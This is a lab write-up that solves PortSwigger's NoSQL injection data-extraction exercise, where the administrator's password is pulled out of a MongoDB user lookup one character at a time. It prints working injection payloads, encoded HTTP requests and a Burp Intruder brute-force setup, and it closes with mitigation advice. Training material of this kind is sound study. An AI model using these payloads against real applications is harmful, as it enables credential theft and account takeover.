# 📘 PortSwigger Lab: Exploiting NoSQL injection to extract data

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/all-labs/nosql-injection/lab-nosql-injection-extract-data  
> 🎯 Topic: NoSQL Injection — syntax injection with character-by-character exfiltration (boolean-based)  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  
> 🛠 Tools: Burp Suite (Repeater, Intruder — Cluster bomb)

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🗺 The Boolean Exfiltration Scheme](#boolean-exfil)
- [🔍 Step 1 — Recon: The Baseline Response](#step1)
- [🔍 Step 2 — Detect: a Quote Breaks the Query](#step2)
- [🔍 Step 3 — Confirm: Valid JS Repairs the Query](#step3)
- [🔍 Step 4 — Boolean Control: True/False](#step4)
- [🔍 Step 5 — Determining the Password Length](#step5)
- [🔍 Step 6 — Character Enumeration in Intruder](#step6)
- [🔍 Step 7 — Logging In as Administrator](#step7)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

The user lookup functionality is powered by MongoDB and is vulnerable to NoSQL injection. The task:

```text
1. Extract the password of the administrator user character by character.
2. Log into the administrator account.
```

Own-account credentials:

```text
wiener:peter
```

Lab hint: the password only uses lowercase letters.

---

<a id="theory"></a>

## 🧠 Short Theory

When the injection does not display data directly (a non-blind case), but does influence page behavior, **boolean-based exfiltration** applies: the database query is turned into a yes/no channel.

Mechanics:

```text
true condition   → the server displays data     → observable response A
false condition  → the server displays an error → observable response B
```

If the responses are distinguishable (different length, different content), the attacker can ask arbitrary questions:

```text
"Does the password start with a?"  → yes/no
"Is the second letter b?"          → yes/no
```

Inside a MongoDB JS expression everything is available: document fields (`this.password`), properties (`length`), indexing (`password[0]`). This allows asking questions about data that is **never shown** in the response.

---

<a id="idea"></a>

## 🧩 Core Idea

The server builds the query from user input:

```javascript
this.username == '<input>'
```

The injection appends arbitrary conditions:

```javascript
this.username == 'administrator' && this.password[0]=='a'
```

The response contains the user's details only if **both** conditions are true. By enumerating a candidate character at each position, we assemble a password that is never displayed in the response.

---

<a id="boolean-exfil"></a>

## 🗺 The Boolean Exfiltration Scheme

```text
1. Detect:        ' breaks the query
2. Confirm:       '+' repairs the query
3. Boolean pair:  && '1'=='2  vs  && '1'=='1  → different responses
4. Metadata:      this.password.length → the length of the secret
5. Enumeration:   this.password[N]=='X' → one character per request
6. Assembly:      8 positions × up to 26 attempts = up to ~200 requests
```

One question per request — slow, but reliable and quiet: no noisy UNIONs or errors, just "found / not found".

---

<a id="step1"></a>

## 🔍 Step 1 — Recon: The Baseline Response

1. Log in as `wiener:peter`.
2. HTTP history → `GET /user/lookup?user=wiener` → Send to Repeater.
3. Note the normal response: the account details (JSON with fields).

This response is the "true baseline" — all further responses are compared against it.

---

<a id="step2"></a>

## 🔍 Step 2 — Detect: a Quote Breaks the Query

```text
user=wiener'      (Ctrl+U → wiener%27)
```

```javascript
this.username == 'wiener''   ← unbalanced quote → syntax error
```

**Expected:** an error ("Could not find user" or 500) instead of the details.

---

<a id="step3"></a>

## 🔍 Step 3 — Confirm: Valid JS Repairs the Query

```text
user=wiener'+'    (Ctrl+U → wiener%27%2b%27)
```

```javascript
this.username == 'wiener'+''   ← valid concatenation
```

**Expected:** the wiener details return.

**Conclusion:** the Step 2 error was a DB-query syntax error, not validation. Injection confirmed.

---

<a id="step4"></a>

## 🔍 Step 4 — Boolean Control: True/False

```text
user=wiener' && '1'=='2    → false → Could not find user
user=wiener' && '1'=='1    → true  → wiener details
```

The quotes in `'1'=='2'` are self-balancing: they close the string and immediately open a new one for the query tail.

**Conclusion:** different responses to true/false = full control over the query logic.

---

<a id="step5"></a>

## 🔍 Step 5 — Determining the Password Length

The key trick: referencing **another document field** inside the condition:

```text
user=administrator' && this.password.length < 30 || 'a'=='b
```

Structure:

```javascript
this.username == 'administrator' && this.password.length < 30 || 'a'=='b'
└── select the admin ─────────────┘└───── our condition ─────┘└── safety tail ─┘
```

`this.password.length` reads a document property that is **absent from the response**. The `|| 'a'=='b` tail (always false) only balances the syntax.

Binary narrowing protocol:

```text
<30 → success → <15 → success → <9 → success → <8 → error
Success at <9 and error at <8  →  password length = 8
```

---

<a id="step6"></a>

## 🔍 Step 6 — Character Enumeration in Intruder

The payload with two positions:

```text
user=administrator' && this.password[§0§]=='§a§
```

Intruder setup:

```text
Attack type:      Cluster bomb (all combinations)
Payload set 1:    numbers 0..7          (character position)
Payload set 2:    a..z                  (candidate letter)
Cookie:           a fresh session=... in the request headers
Payload encoding: no double URL-encoding
```

Reading the results:

```text
Sort by: Payload 1, then Length
The true response (admin details) is longer than the false one (error)
→ in each position exactly one request stands out by Length
→ the letter from its Payload 2 column is the correct one
```

Assemble the 8 letters across positions 0–7 → the password.

**Practical requirements for success:**

```text
- A fresh session cookie in the request (Intruder does not inherit
  the browser session)
- Do not click around the lab while the attack runs (session rotation
  breaks half of the requests)
- One manual Repeater test before launching:
  this.password[0]=='a' vs =='b' must differ when tested by hand
```

---

<a id="step7"></a>

## 🔍 Step 7 — Logging In as Administrator

Enter the assembled password in the login form as `administrator` → access to the admin account → the lab is Solved.

---

<a id="requests"></a>

## 📨 Example Requests

### Step 2 — detect

```http
GET /user/lookup?user=wiener%27 HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

### Step 4 — boolean pair

```http
GET /user/lookup?user=wiener%27%20%26%26%20%271%27%3d%3d%272 HTTP/2
GET /user/lookup?user=wiener%27%20%26%26%20%271%27%3d%3d%271 HTTP/2
```

### Step 5 — password length

```http
GET /user/lookup?user=administrator%27%20%26%26%20this.password.length%20%3c%2030%20%7c%7c%20%27a%27%3d%3d%27b HTTP/2
```

### Step 6 — Intruder template

```http
GET /user/lookup?user=administrator%27%20%26%26%20this.password%5B0%5D%3d%3d%27a HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

(in Intruder, `0` and `a` are the payload positions)

---

<a id="response"></a>

## 📥 Example Result

### Step 4 — response difference

```text
false → Could not find user
true  → {"username":"wiener","email":"wiener@...","..."}
```

### Step 5 — length

```text
length < 9  → administrator details   (true)
length < 8  → Could not find user     (false)
→ password length: 8
```

### Step 6 — password assembly

```text
Position 0: the letter whose response is longer than the rest
Position 1: ...
...
Position 7: ...
→ an 8-character lowercase password
```

### Step 7 — final

```text
Login administrator:<assembled password> → the admin account page

Lab status: Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter → GET /user/lookup?user=wiener to Repeater
2. wiener' → error (detect)
3. wiener'+' → wiener details (injection confirmed)
4. && '1'=='2 vs && '1'=='1 → different responses (boolean control)
5. administrator' && this.password.length < N → length = 8
6. Intruder Cluster bomb: this.password[§N§]=='§a§ → 8 letters assembled
7. Login administrator:<password> → Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. Input Lands in a JS Expression Unsanitized

String concatenation instead of a parameterized query: any JS constructs are executed by the query engine.

### 2. Document Fields Are Accessible Inside the Condition

`this.password` is available for comparison even though the response hides it. Output filtering ≠ access filtering within the condition.

### 3. The Response Is Distinguishable by Content/Length

"Details found" vs "Could not find user" — two distinct observable states. That is the boolean oracle.

### 4. The Search Space Is Small

8 positions × 26 letters = up to ~200 requests. Lowercase letters + a known length compress the task to a trivial enumeration.

### 5. Automation with a Standard Tool

Cluster bomb in Intruder is a built-in capability. No special tools needed — only correct payload positions and a stable session.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

The boolean-based exfiltration method for any blind context:

```text
1. Find an observable difference: response length, status, content, timing
2. Build the "question asker": && <condition> inside the injection
3. Metadata first (length), then values (==)
4. Narrow the alphabet (hint: lowercase) and the length BEFORE enumeration
5. Automate with combination brute-forcing (Cluster bomb)
6. Ensure stability: one session, fresh cookies, no parallel actions
```

Key discipline: before mass enumeration — **one manual verification request**. If `password[0]=='a'` and `=='b'` do not differ when tested by hand, Intruder will not save you — fix the payload/cookie first.

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Not Encoding the Payload

Raw `'`, `&&`, `[` in a URL break the request before the DB → identical responses to everything. Always Ctrl+U; in Intruder, watch for double encoding.

### Mistake 2. Forgetting the Session Cookie in Intruder

Intruder sends the request exactly as recorded. Without `Cookie: session=...` every response is "not logged in" — all identical. A fresh cookie is mandatory; do not activate the session elsewhere in parallel.

### Mistake 3. Wrong Position Markers

`§` markers sent as text, or one position instead of two → Intruder enumerates the wrong thing. Verify: Payload positions count = 2, markers highlighted in the Positions tab.

### Mistake 4. Expecting the True Response via Status Code

Both responses are 200. The difference is in **length and content** (data vs an error message). Sort by Length, read the content.

### Mistake 5. Skipping the Length Determination

Without `length`, the enumeration is blind: you do not know how many positions to collect or when to stop. Metadata first, values then.

### Mistake 6. Leaving the Safety Tail in the Enumeration Payload

The `|| 'a'=='b` tail from the length payload does not belong in `this.password[§0§]=='§a§` — extra quotes break the syntax balance when payloads are substituted.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Parameterized Queries

A structured filter instead of concatenation:

```javascript
collection.find({ username: String(userInput) })
// never assemble JS expression strings from user input
```

### 2. Type Validation and Character Whitelisting

Validate the input type and reject JS special characters (`'`, `&&`, `||`, `[`, `.`).

### 3. No $where with User-Controlled Data

`$where` executes JS on the server — remove it or replace it with ordinary operators.

### 4. Uniform Error Messages

"Could not find user" vs "details" is an oracle. Identical responses for not-found and error cases break the boolean channel.

### 5. Rate Limiting and Anomaly Monitoring

Hundreds of requests to one endpoint with the same pattern — a signal for alerting and throttling.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] GET /user/lookup?user=wiener in Repeater, baseline saved

### Detect and Confirm

- [ ] `wiener'` → error
- [ ] `wiener'+'` → wiener details

### Boolean Control

- [ ] `&& '1'=='2` → Could not find user
- [ ] `&& '1'=='1` → wiener details

### Exfiltration

- [ ] Password length determined (= 8)
- [ ] Intruder: Cluster bomb, 2 positions, cookie in the request
- [ ] 8 letters assembled across positions 0–7
- [ ] Login administrator:<password> → Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via **boolean-based syntax injection** with character-by-character exfiltration:

```text
1. Injection confirmed (detect → repair → boolean pair)
2. this.password.length gave the secret's length (8)
3. this.password[N]=='X' turned the query into a yes/no channel
4. Cluster bomb assembled 8 letters in ~200 requests
5. A legitimate admin login
```

Main lessons:

```text
A blind injection is not harmless: a yes/no channel extracts data character by character.
```

```text
Document fields are accessible in the condition even when hidden in the response — this.password proves it.
```

```text
Metadata (length) first, values then: narrow the search space before enumeration.
```

```text
Tooling discipline: a fresh session, single encoding, a manual check before automation.
```

```text
Mitigation: parameterization, type validation, uniform errors, rate limiting.
```

---

[⬆ Back to top](#top)
